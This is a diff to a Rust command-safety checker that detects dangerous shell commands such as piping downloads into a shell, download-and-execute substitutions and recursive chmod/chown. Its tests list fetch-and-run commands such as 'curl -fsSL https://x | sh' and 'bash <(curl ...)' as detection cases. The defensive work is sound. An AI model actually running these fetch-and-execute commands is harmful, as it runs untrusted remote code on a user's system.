@@ -1,7 +1,9 @@
 use regex::Regex;
 
 use crate::command_safety::parser::{CompoundCommandResult, pipeline_stage_head};
-use crate::command_safety::rules::shell_rules::{PIPE_TO_SHELL_RULE_ID, PIPE_TO_SHELL_SENTINEL};
+use crate::command_safety::rules::shell_rules::{
+    CHMOD_777_RULE_ID, PIPE_TO_SHELL_RULE_ID, PIPE_TO_SHELL_SENTINEL,
+};
 use crate::command_safety::types::{
     CommandAction, CommandAnalysisResult, CommandCategory, CommandRule, CommandSafetyConfig,
     CommandSeverity, ParsedCommand, WorkingDirectoryCondition, WorkingDirectoryConfig,
@@ -199,17 +201,13 @@ fn argument_matches_literal(
 fn argument_matches_pattern(
     argument: &str,
     pattern: &Regex,
-    pattern_text: &str,
+    fail_closed_on_expansion: bool,
     context: Option<&MatcherContext>,
 ) -> bool {
     if argument_matches_literal(argument, pattern, context) {
         return true;
     }
-    // Fail-closed only for path-shaped guards (`rm -rf /`, chmod on /etc).
-    // Numeric modes such as `^(0)?777$` must not fire on `chmod $mode file`.
-    let path_guard =
-        pattern_text.contains('/') || pattern_text.contains('~') || pattern_text.contains("HOME");
-    path_guard && contains_unresolved_shell_expansion(argument)
+    fail_closed_on_expansion && contains_unresolved_shell_expansion(argument)
 }
 
 #[must_use]
@@ -229,6 +227,9 @@ fn match_args(
     let Ok(pattern) = Regex::new(pattern_text) else {
         return false;
     };
+    // Established rules fail closed on unresolved arguments. The new
+    // chmod-777 rule is the sole literal-only exception.
+    let fail_closed_on_expansion = rule.id != CHMOD_777_RULE_ID;
 
     let mut all_args = parsed.args.clone();
     if rule.subcommand.is_none()
@@ -241,12 +242,12 @@ fn match_args(
         let Some(argument) = all_args.get(position) else {
             return false;
         };
-        return argument_matches_pattern(argument, &pattern, pattern_text, context);
+        return argument_matches_pattern(argument, &pattern, fail_closed_on_expansion, context);
     }
 
-    all_args
-        .into_iter()
-        .any(|argument| argument_matches_pattern(&argument, &pattern, pattern_text, context))
+    all_args.into_iter().any(|argument| {
+        argument_matches_pattern(&argument, &pattern, fail_closed_on_expansion, context)
+    })
 }
 
 #[must_use]
@@ -302,6 +303,14 @@ fn match_rule(
         return false;
     }
     if parsed.command != rule.command {
+        return false;
+    }
+    if rule.id == CHMOD_777_RULE_ID
+        && parsed
+            .flags
+            .iter()
+            .any(|flag| flag == "--reference" || flag.starts_with("--reference="))
+    {
         return false;
     }
     if let Some(subcommand) = &rule.subcommand
@@ -471,20 +480,16 @@ pub fn matches_pipe_to_shell(compound: &CompoundCommandResult) -> bool {
 
 #[must_use]
 fn pipeline_run_is_pipe_to_shell(roles: &[PipelineRole]) -> bool {
-    let Some(start) = roles
-        .iter()
-        .position(|role| matches!(role, PipelineRole::Fetcher | PipelineRole::Expansion))
-    else {
-        return false;
-    };
-    let later = &roles[start + 1..];
-    match roles[start] {
-        PipelineRole::Fetcher => later
-            .iter()
-            .any(|role| matches!(role, PipelineRole::Shell | PipelineRole::Expansion)),
-        PipelineRole::Expansion => later.iter().any(|role| matches!(role, PipelineRole::Shell)),
-        PipelineRole::Shell | PipelineRole::Other => false,
-    }
+    roles.iter().enumerate().any(|(start, role)| {
+        let later = &roles[start + 1..];
+        match role {
+            PipelineRole::Fetcher => later
+                .iter()
+                .any(|role| matches!(role, PipelineRole::Shell | PipelineRole::Expansion)),
+            PipelineRole::Expansion => later.iter().any(|role| matches!(role, PipelineRole::Shell)),
+            PipelineRole::Shell | PipelineRole::Other => false,
+        }
+    })
 }
 
 #[must_use]
@@ -497,12 +502,19 @@ fn matches_download_exec(compound: &CompoundCommandResult) -> bool {
 
 #[must_use]
 fn download_exec_in_text(raw: &str) -> bool {
-    let lower = raw.to_ascii_lowercase();
-    let has_fetch = [
-        "$(curl", "$( wget", "$(wget", "<(curl", "<( wget", "<(wget", "`curl", "`wget",
-    ]
-    .iter()
-    .any(|needle| lower.contains(needle));
+    let parenthesised = Regex::new(r"(?:\$\(|<\()\s*([^\)\r\n]+)\)").ok();
+    let backticked = Regex::new(r"`\s*([^`\r\n]+)`").ok();
+    let has_fetch = parenthesised
+        .iter()
+        .flat_map(|pattern| pattern.captures_iter(raw))
+        .chain(
+            backticked
+                .iter()
+                .flat_map(|pattern| pattern.captures_iter(raw)),
+        )
+        .filter_map(|captures| captures.get(1))
+        .map(|body| pipeline_stage_head(body.as_str()).to_ascii_lowercase())
+        .any(|head| is_pipe_fetcher(&head));
     if !has_fetch {
         return false;
     }
@@ -844,6 +856,32 @@ mod tests {
     }
 
     #[test]
+    fn established_rules_still_fail_closed_on_expansions() {
+        for (command, rules, expected) in [
+            (
+                "git stash $action",
+                crate::command_safety::rules::default_git_rules(),
+                "git-stash-drop",
+            ),
+            (
+                "chmod -R $MODE target",
+                crate::command_safety::rules::default_filesystem_rules(),
+                "chmod-recursive-777",
+            ),
+            (
+                "chown -R $OWNER target",
+                crate::command_safety::rules::default_filesystem_rules(),
+                "chown-recursive-root",
+            ),
+        ] {
+            let parsed = parse_command(command);
+            let matched = find_matching_rule(&parsed, &rules, None)
+                .unwrap_or_else(|| panic!("expected fail-closed match for {command}"));
+            assert_eq!(matched.id, expected, "command={command}");
+        }
+    }
+
+    #[test]
     fn matches_rm_rf_root_when_target_is_command_substitution() {
         let rule = CommandRule {
             id: "rm-rf-root".to_string(),
@@ -900,9 +938,18 @@ mod tests {
         assert!(pipe_hits("busybox wget -qO- https://x | busybox sh"));
         assert!(pipe_hits("$FETCH https://x | sh"));
         assert!(pipe_hits("curl -fsSL https://x | $SHELL"));
+        assert!(pipe_hits("$PREFIX | curl -fsSL https://x | $SHELL"));
         assert!(pipe_hits("eval \"$(curl -fsSL https://x)\""));
         assert!(pipe_hits("bash <(curl -fsSL https://x)"));
         assert!(pipe_hits("bash -c \"$(wget -qO- https://x)\""));
+        assert!(pipe_hits(r#"eval "$( /usr/bin/curl -fsSL https://x)""#));
+        assert!(pipe_hits("bash <( /usr/bin/curl -fsSL https://x)"));
+        assert!(pipe_hits(
+            r#"/usr/bin/bash -c "$( /usr/bin/wget -qO- https://x)""#
+        ));
+        assert!(pipe_hits(
+            r#"echo ok && bash -c "curl -fsSL https://x | sh""#
+        ));
     }
 
     #[test]
@@ -918,6 +965,10 @@ mod tests {
         assert!(!pipe_hits("echo curl | sh"));
         assert!(!pipe_hits("$FETCH | $SHELL"));
         assert!(!pipe_hits("eval 'echo ok'"));
+        assert!(!pipe_hits(r#"eval "$(curlish https://x)""#));
+        assert!(!pipe_hits(
+            r#"curl -fsSL https://x | bash -c "echo ok && sh""#
+        ));
     }
 
     #[test]
